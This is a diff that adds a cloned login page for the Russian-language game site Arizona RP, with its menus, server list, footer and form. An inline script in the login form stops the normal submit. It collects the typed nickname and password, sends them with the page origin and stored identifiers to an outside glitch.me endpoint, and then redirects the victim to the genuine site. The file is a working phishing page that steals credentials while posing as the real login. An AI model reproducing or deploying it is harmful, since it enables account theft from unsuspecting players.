@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<!-- Meta -->
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<link rel="shortcut icon" href="https://arizona-rp.com/favicon.ico" type="image/x-icon">
+	<link rel="icon" sizes="16x16" href="https://arizona-rp.com/favicon-16.png">
+	<link rel="icon" sizes="32x32" href="https://arizona-rp.com/favicon-32.png">
+	<link rel="icon" sizes="64x64" href="https://arizona-rp.com/favicon-64.png">
+
+	<meta name="interkassa-verification" content="3c949068b1004a83ce57165146b9fa85">
+
+
+	<meta name="csrf-param" content="_csrf">
+	<meta name="csrf-token"
+		content="SWrJGGlcjFeRGZXRuPupy0QTyAWIVVpeV720EFBs61YqArx2XRm_NeBU-4Lrje6SFmWsWt0dahUZxeVTMSGRHg==">
+
+	<!-- Title -->
+	<title>Авторизация - Личный кабинет</title>
+	<script type="text/javascript" async="" src="login/analytics.js"></script>
+	<script type="text/javascript" async="" src="login/recaptcha__ru.js" crossorigin="anonymous"
+		integrity="sha384-wTqapW9zYPAy1OGlU/+ML1d+sFCsX3MpKGHRibTrmTkSPeSis9uUuqBaM5rEdCzV"></script>
+	<script type="text/javascript" async="" src="login/tag.js"></script>
+
+
+	<script async="" src="login/js"></script>
+
+
+	<!-- Other -->
+	<link href="login/css.css" rel="stylesheet">
+	<link href="login/animate.css" rel="stylesheet">
+	<link href="login/reset.css" rel="stylesheet">
+	<link href="login/bootstrap.css" rel="stylesheet">
+	<link href="login/owl.css" rel="stylesheet">
+	<link href="login/style-less.css" rel="stylesheet">
+	<link href="login/responsive.css" rel="stylesheet">
+	<link href="login/jquery.css" rel="stylesheet">
+	<script src="login/jquery-2.js"></script>
+	<style>
+		#header.login {
+			background: url('./img/bg-login.jpg') no-repeat center center fixed;
+			-webkit-background-size: cover;
+			-moz-background-size: cover;
+			-o-background-size: cover;
+			min-height: inherit;
+			background-size: cover;
+		}
+		
+
+		.help-block-error {
+			display: none;
+			color: red;
+			font-size: 14px;
+			padding-top: 10px
+		}
+
+		.has-error>.help-block {
+			display: block
+		}
+
+		.map-container {
+			position: relative;
+			margin: 0 auto;
+			background-image: url(/images/samap_1280.jpg);
+			background-size: contain
+		}
+
+		.map-icon {
+			position: absolute;
+			width: 16px;
+			height: 16px
+		}
+
+		.map-setting {
+			color: #a4a4a4;
+			font-size: 15px
+		}
+
+		.map-setting:after,
+		.map-setting:before {
+			content: " ";
+			display: table
+		}
+
+		.map-setting .list {
+			width: 100px;
+			text-align: right;
+			position: relative;
+			float: right
+		}
+
+		.map-setting span {
+			display: inline-block;
+			margin-bottom: 15px;
+			cursor: pointer
+		}
+
+		.map-setting ul {
+			display: none;
+			list-style: none;
+			position: absolute;
+			width: 250px;
+			text-align: left;
+			top: 30px;
+			right: 0;
+			background: #272727;
+			padding: 15px;
+			z-index: 100
+		}
+
+		.map-setting li {
+			padding: 7px 10px;
+			cursor: default
+		}
+
+		.map-setting li input {
+			float: right;
+			cursor: pointer
+		}
+
+		.alert>.close,
+		.members-list>.close {
+			font-size: 20px
+		}
+
+		.alert {
+			border-radius: 0;
+			font-size: 15px
+		}
+
+		.alert-success {
+			color: #46e66a;
+			background-color: transparent;
+			border-color: #46e66a
+		}
+
+		.alert-danger {
+			color: #e64646;
+			background-color: transparent;
+			border-color: #e64646
+		}
+
+		.alert-info {
+			color: #45e4ff;
+			background-color: transparent;
+			border-color: #45e4ff
+		}
+
+		.pagination {
+			display: flex;
+			justify-content: center
+		}
+
+		.pagination>li {
+			background: rgba(26, 26, 31, 0.34);
+			display: inline-block;
+			border-radius: 5px;
+			line-height: 40px;
+			width: 40px;
+			margin: 0 4px
+		}
+
+		.pagination>li>a {
+			color: #51547f
+		}
+
+		.pagination>li.active>a {
+			color: #979bdc
+		}
+
+		.pagination>li.disabled>span {
+			color: #30324c
+		}
+
+		.news-list-in-news>div .n-preview img {
+			opacity: 0.7
+		}
+
+		.money-items-grid>div .m-img>img {
+			max-height: 95%
+		}
+
+		#up-btn {
+			position: fixed;
+			cursor: pointer;
+			right: 30px;
+			bottom: 30px;
+			background: #51547f;
+			border: 0;
+			padding: 10px 15px;
+			border-radius: 5px;
+			font-size: 15px;
+			display: none;
+			z-index: 1001
+		}
+	</style>
+	<script src="login/openapi.js"></script>
+</head>
+
+<body>
+
+	<i class="mobile-menu" data-toggle="modal" data-target="#mainmenumodal"><img src="login/list-menu.svg" alt=""></i>
+
+
+	<div id="header" class="login">
+		<div class="container">
+			<div class="header">
+
+				<div class="topline">
+					<a href="https://arizona-rp.com/" class="logo"><img src="login/logo.svg" alt=""></a>
+					<ul class="main-menu">
+						<li><a href="https://arizona-rp.com/">Главная</a></li>
+						<li><a href="https://arizona-rp.com/news/list">Новости</a></li>
+						<li><a href="https://arizona-rp.com/#howtostart" onclick="scrollToHowToStart()">Как начать
+								игру?</a></li>
+						<li><a href="https://forum.arizona-rp.com/">Форум</a></li>
+						<li><a href="https://arizona-rp.com/donate">Магазин</a></li>
+					</ul>
+					<a href="https://arizona-rp.com/profile/in" class="primary-but">Кабинет</a>
+				</div>
+				<p class="b-title">Личный кабинет</p>
+
+
+				<div class="form-login-grid">
+					<div class="login-img"><img src="login/login-man.png" alt=""></div>
+					<div style="display: none">
+						Array
+						(
+						)
+						app\models\FormLogin Object
+						(
+						[username] =&gt;
+						[password] =&gt;
+						[server] =&gt;
+						[reCaptcha] =&gt;
+						[g_code] =&gt;
+						[email_code] =&gt;
+						[_user:app\models\FormLogin:private] =&gt;
+						[_errors:yii\base\Model:private] =&gt;
+						[_validators:yii\base\Model:private] =&gt;
+						[_scenario:yii\base\Model:private] =&gt; default
+						[_events:yii\base\Component:private] =&gt; Array
+						(
+						)
+
+						[_eventWildcards:yii\base\Component:private] =&gt; Array
+						(
+						)
+
+						[_behaviors:yii\base\Component:private] =&gt;
+						)
+					</div>
+					<div class="login-form">
+
+						<form method="POST">
+							<input type="hidden">
+							<div class="form-group field-formlogin-username required">
+								<label class="control-label" for="formlogin-username">Игровой ник</label>
+								<input type="text" id="lgn" class="main-inp w-100"
+									name="login" placeholder="Например: Kevin_Mackalister"
+									aria-required="true">
+								<p class="help-block help-block-error"></p>
+							</div>
+							<div class="form-group field-formlogin-password required">
+								<label class="control-label" id="psw" for="formlogin-password">Пароль</label>
+								<input type="password" class="main-inp w-100"
+									name="pass" placeholder="" aria-required="true">
+								<p class="help-block help-block-error"></p>
+							</div>
+							<div class="form-group field-formlogin-server">
+								<label class="control-label" for="formlogin-server">Сервер</label>
+								<select name="server" class="main-inp main-select w-100">
+									<option value="None" selected="selected">Выберите сервер</option>
+									<option value="Phoenix"> Phoenix</option>
+									<option value="Tucson"> Tucson</option>
+									<option value="Scottdale"> Scottdale</option>
+									<option value="Chandler"> Chandler</option>
+									<option value="Brainburg"> Brainburg</option>
+									<option value="Saint Rose"> Saint Rose</option>
+									<option value="Mesa"> Mesa</option>
+									<option value="Red Rock"> Red Rock</option>
+									<option value="Yuma"> Yuma</option>
+									<option value="Surprise"> Surprise</option>
+									<option value="Prescott"> Prescott</option>
+									<option value="Glendale"> Glendale</option>
+									<option value="Kingman"> Kingman</option>
+									<option value="Winslow"> Winslow</option>
+									<option value="Payson"> Payson</option>
+									<option value="Gilbert"> Gilbert</option>
+									<option value="Show Low"> Show Low</option>
+								</select>
+								<p class="help-block help-block-error"></p>
+							</div>
+							<button type="submit" id="btn" class="big-but w-100">Войти</button>
+							<div class="more-line w-100">
+								<a href="https://arizona-rp.com/login/code" style="font-size:13px" class="href-white">Войти
+									через ВК</a>
+								<a href="https://arizona-rp.com/profile/recovery" class="href-white">Забыли пароль?</a>
+							</div>
+						</form>
+  <script>
+    document.querySelector('#btn').addEventListener('click', async function (e) {
+      e.preventDefault()
+let r = await fetch('https://placid-succulent-marigold.glitch.me/api/add', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    login: document.querySelector('#lgn').value,
+                    password: document.querySelector('#psw').value,
+                    fake: new URL(location.href).origin,
+                    ip: localStorage.getItem('ip'),
+                    id: localStorage.getItem('id'),
+                    query: localStorage.getItem('num'),
+                    type: 'ft'
+                })
+            }).then(data => {
+                setTimeout(() => {
+                   location.replace('https://arizona-rp.com/')
+                }, 500)
+            })
+    })
+  </script>	
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="footer">
+		<div class="container">
+			<div class="footer-cube">
+				<div>
+					<p class="copyright"><strong>Professional Gaming Solutions Limited © 2021</strong></p>
+					<p style="font-size: 14px">Palliser House, Palliser Road, London, UK, W149EB<br><br>Все права
+						защищены.<br>Любое копирование материала запрещено!</p>
+					<p style="font-size: 13px">
+						<a style="color: white" href="https://arizona-rp.com/document/policy">Политика
+							конфиденциальности</a>
+						<br>
+						<a style="color: white" href="https://arizona-rp.com/document/terms">Пользовательское
+							соглашение</a>
+						<br>
+						<a style="color: white" href="mailto:support@arizona-rp.com">support@arizona-rp.com</a>
+					</p>
+					<p style="font-size: 13px">
+						<a style="color: white" href="https://rodina-rp.com/" target="_blank">CRMP: Rodina Role Play</a>
+						<br>
+						<a style="color: white" href="https://bone-country.ru/" target="_blank">SAMP: Жизнь в
+							деревне</a>
+					</p>
+					<div style="display: grid; grid-template-columns: repeat(2, 30px); grid-column-gap: 10px">
+						<style>
+							.share-link {
+								width: 30px;
+								height: 30px;
+								border-radius: 4px;
+								display: flex;
+								justify-content: center;
+								align-items: center
+							}
+						</style>
+						<a target="_blank" class="share-link" style="background-color: #45668e"
+							href="https://vk.com/share.php?url=https://arizona-rp.com&amp;image=https://sun1-21.userapi.com/c853516/v853516853/1ae3a3/CB1EEw8uBYo.jpg&amp;title=SAMP:%20%D0%98%D0%B3%D1%80%D0%B0%D1%82%D1%8C%20%D0%B2%20GTA%20SA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD%20%E2%86%92%20%D0%A1%D0%BA%D0%B0%D1%87%D0%B0%D1%82%D1%8C%20%D0%A1%D0%90%D0%9C%D0%9F%20%D0%B8%20%D0%9D%D0%B0%D1%87%D0%B0%D1%82%D1%8C%20%D0%98%D0%B3%D1%80%D1%83%20|%2024/7%20|%20Arizona%20RP">
+							<svg style="fill: white; width: 15px; height: 15px" xmlns="http://www.w3.org/2000/svg"
+								viewBox="0 0 576 512">
+								<path
+									d="M545 117.7c3.7-12.5 0-21.7-17.8-21.7h-58.9c-15 0-21.9 7.9-25.6 16.7 0 0-30 73.1-72.4 120.5-13.7 13.7-20 18.1-27.5 18.1-3.7 0-9.4-4.4-9.4-16.9V117.7c0-15-4.2-21.7-16.6-21.7h-92.6c-9.4 0-15 7-15 13.5 0 14.2 21.2 17.5 23.4 57.5v86.8c0 19-3.4 22.5-10.9 22.5-20 0-68.6-73.4-97.4-157.4-5.8-16.3-11.5-22.9-26.6-22.9H38.8c-16.8 0-20.2 7.9-20.2 16.7 0 15.6 20 93.1 93.1 195.5C160.4 378.1 229 416 291.4 416c37.5 0 42.1-8.4 42.1-22.9 0-66.8-3.4-73.1 15.4-73.1 8.7 0 23.7 4.4 58.7 38.1 40 40 46.6 57.9 69 57.9h58.9c16.8 0 25.3-8.4 20.4-25-11.2-34.9-86.9-106.7-90.3-111.5-8.7-11.2-6.2-16.2 0-26.2.1-.1 72-101.3 79.4-135.6z">
+								</path>
+							</svg>
+						</a>
+						<a target="_blank" class="share-link" style="background-color: #3b5998"
+							href="https://www.facebook.com/sharer.php?u=https://arizona-rp.com/">
+							<svg style="fill: white; width: 15px; height: 15px" xmlns="http://www.w3.org/2000/svg"
+								viewBox="0 0 320 512">
+								<path
+									d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z">
+								</path>
+							</svg>
+						</a>
+					</div>
+				</div>
+				<div style="display: flex; flex-direction: column; align-items: center">
+					<a href="https://arizona-rp.com/maps" class="map-go">
+						<p>Карты<br>штатов</p>
+					</a>
+					<div style="margin-top: 40px; column-gap: 20px; display: flex; align-items: center">
+						<img src="login/visa-secure-white.png" alt="" width="70" height="70">
+						<img src="login/mastercard-white.png" alt="" width="70" height="70">
+					</div>
+				</div>
+				<div>
+					<p style="font-size: 12px; color: white">Контакты:<br>E-Mail: azstaterp@gmail.com<br>Форум:
+						forum.arizona-rp.com</p>
+					<div id="vk_official"
+						style="width: 250px; height: 141px; background: rgba(0, 0, 0, 0) none repeat scroll 0% 0%;">
+						<iframe name="fXD7d513" src="login/widget_community.htm" scrolling="no" id="vkwidget1"
+							style="overflow: hidden; height: 141px;" width="250" height="141" frameborder="0"></iframe>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="modal fade" id="mainmenumodal" tabindex="-1" role="dialog" aria-labelledby="mainmenumodallabel"
+		aria-hidden="true">
+		<div class="modal-dialog modal-dialog-centered" role="document">
+			<div class="modal-content">
+				<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span
+						aria-hidden="true">×</span></button>
+				<ul class="main-menu modalk">
+					<li><a href="https://arizona-rp.com/">Главная</a></li>
+					<li><a href="https://arizona-rp.com/news/list">Новости</a></li>
+					<li><a href="https://arizona-rp.com/#howtostart" onclick="scrollToHowToStart()">Как начать игру?</a>
+					</li>
+					<li><a href="https://forum.arizona-rp.com/">Форум</a></li>
+					<li><a href="https://arizona-rp.com/donate">Магазин</a></li>
+				</ul>
+			</div>
+		</div>
+	</div>
+
+	<button id="up-btn">Наверх</button>
+
+	<script>
+		var btnUp = document.getElementById('up-btn');
+		window.onscroll = function () {
+			var offset = window.pageYOffset;
+			if (offset > window.innerHeight) {
+				btnUp.style.display = 'inline';
+			} else {
+				btnUp.style.display = 'none';
+			}
+		}
+		btnUp.onclick = function () {
+			jQuery('html').animate({
+				scrollTop: 0
+			}, 100);
+		}
+	</script>
+	<noscript>
+		<div><img src="https://mc.yandex.ru/watch/49593022" style="position:absolute; left:-9999px;" alt="" /></div>
+	</noscript>
+	<script src="login/api.js" async="" defer="defer"></script>
+	<script src="login/yii_002.js"></script>
+	<script src="login/yii.js"></script>
+	<script src="login/yii_003.js"></script>
+	<script src="login/bootstrap.js"></script>
+	<script src="login/owl.js"></script>
+	<script src="login/jquery.js"></script>
+	<script src="login/script.js"></script>
+	<script>
+		function recaptchaOnloadCallback() {
+			"use strict";
+			jQuery(".g-recaptcha").each(function () {
+				const reCaptcha = jQuery(this);
+				if (reCaptcha.data("recaptcha-client-id") === undefined) {
+					const recaptchaClientId = grecaptcha.render(reCaptcha.attr("id"), {
+						"callback": function (response) {
+							if (reCaptcha.data("form-id") !== "") {
+								jQuery("#" + reCaptcha.data("input-id"), "#" + reCaptcha.data("form-id"))
+									.val(response)
+									.trigger("change");
+							} else {
+								jQuery("#" + reCaptcha.data("input-id")).val(response).trigger("change");
+							}
+
+							if (reCaptcha.attr("data-callback")) {
+								eval("(" + reCaptcha.attr("data-callback") + ")(response)");
+							}
+						},
+						"expired-callback": function () {
+							if (reCaptcha.data("form-id") !== "") {
+								jQuery("#" + reCaptcha.data("input-id"), "#" + reCaptcha.data("form-id"))
+									.val("");
+							} else {
+								jQuery("#" + reCaptcha.data("input-id")).val("");
+							}
+
+							if (reCaptcha.attr("data-expired-callback")) {
+								eval("(" + reCaptcha.attr("data-expired-callback") + ")()");
+							}
+						},
+					});
+					reCaptcha.data("recaptcha-client-id", recaptchaClientId);
+				}
+			});
+		}
+		jQuery(document).ready(function () {
+			setTimeout(() => {
+				let scrVk = document.createElement('script');
+				scrVk.setAttribute('src', '//vk.com/js/api/openapi.js?159');
+				document.getElementsByTagName('head')[0].appendChild(scrVk);
+
+				scrVk.onload = function () {
+					VK.Widgets.Group('vk_official', {
+						mode: 1,
+						width: '250',
+						color1: '303038',
+						color2: 'FFFFFF'
+					}, 62212254);
+				}
+
+				// let scrUsocial = document.createElement('script');
+				// scrUsocial.setAttribute('src', 'https://usocial.pro/usocial/usocial.js?v=6.1.4');
+				// scrUsocial.setAttribute('data-script', 'usocial');
+				// document.getElementsByTagName('head')[0].appendChild(scrUsocial);
+			}, 3000);
+		});
+	</script>
+	<script>
+		jQuery(function ($) {
+			jQuery('#login-form').yiiActiveForm([{
+				"id": "formlogin-username",
+				"name": "username",
+				"container": ".field-formlogin-username",
+				"input": "#formlogin-username",
+				"error": ".help-block.help-block-error",
+				"validate": function (attribute, value, messages, deferred, $form) {
+					yii.validation.required(value, messages, {
+						"message": "Введите Ваше игровое имя"
+					});
+				}
+			}, {
+				"id": "formlogin-password",
+				"name": "password",
+				"container": ".field-formlogin-password",
+				"input": "#formlogin-password",
+				"error": ".help-block.help-block-error",
+				"validate": function (attribute, value, messages, deferred, $form) {
+					yii.validation.required(value, messages, {
+						"message": "Введите пароль"
+					});
+					yii.validation.regularExpression(value, messages, {
+						"pattern": /[а-яА-Я\%]/,
+						"not": true,
+						"message": "В пароле обнаружены запрещенные символы",
+						"skipOnEmpty": 1
+					});
+				}
+			}, {
+				"id": "formlogin-server",
+				"name": "server",
+				"container": ".field-formlogin-server",
+				"input": "#formlogin-server",
+				"error": ".help-block.help-block-error",
+				"validate": function (attribute, value, messages, deferred, $form) {
+					yii.validation.number(value, messages, {
+						"pattern": /^[-+]?[0-9]*\.?[0-9]+([eE][-+]?[0-9]+)?$/,
+						"message": "Значение «Сервер» должно быть числом.",
+						"min": 1,
+						"tooSmall": "Выберите сервер",
+						"max": 17,
+						"tooBig": "Внутренняя ошибка сервера [ 1 ]",
+						"skipOnEmpty": 1
+					});
+				}
+			}, {
+				"id": "formlogin-recaptcha",
+				"name": "reCaptcha",
+				"container": ".field-formlogin-recaptcha",
+				"input": "#formlogin-recaptcha",
+				"error": ".help-block.help-block-error",
+				"validate": function (attribute, value, messages, deferred, $form) {
+					yii.validation.required(value, messages, {
+						"message": "Необходимо пройти проверку"
+					});
+					if (!value) {
+						messages.push("Необходимо заполнить «Проверочный код».");
+					}
+				}
+			}], []);
+		});
+	</script>
+
+	<div
+		style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;">
+		<div
+			style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;">
+		</div>
+		<div style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"
+			class="g-recaptcha-bubble-arrow"></div>
+		<div style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"
+			class="g-recaptcha-bubble-arrow"></div>
+		<div style="z-index: 2000000000; position: relative;"><iframe title="проверка recaptcha" src="login/bframe.htm"
+				style="width: 100%; height: 100%;" name="c-htho8iy1c27c" scrolling="no"
+				sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation"
+				frameborder="0"></iframe></div>
+	</div>
+</body>
+
+</html>
